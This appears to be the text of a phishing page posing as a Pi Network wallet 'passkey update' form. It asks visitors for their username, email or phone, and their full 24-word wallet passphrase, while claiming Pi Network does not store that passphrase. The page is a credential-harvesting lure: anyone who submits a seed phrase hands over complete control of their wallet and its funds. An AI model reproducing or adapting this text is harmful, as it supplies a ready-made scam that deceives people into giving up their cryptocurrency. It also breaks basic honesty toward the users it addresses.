Request Passkey Update

As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible. For more info, click here.

Instructions

1. Enter your username as registered on Pi Network.

2. Provide your email or phone number associated with your Pi Wallet.

3. Enter your 24-word passphrase exactly as given during wallet creation.

4. Click "Submit Request" to send your request for review.

⚠️ Important: Pi Network does not store your passphrase.
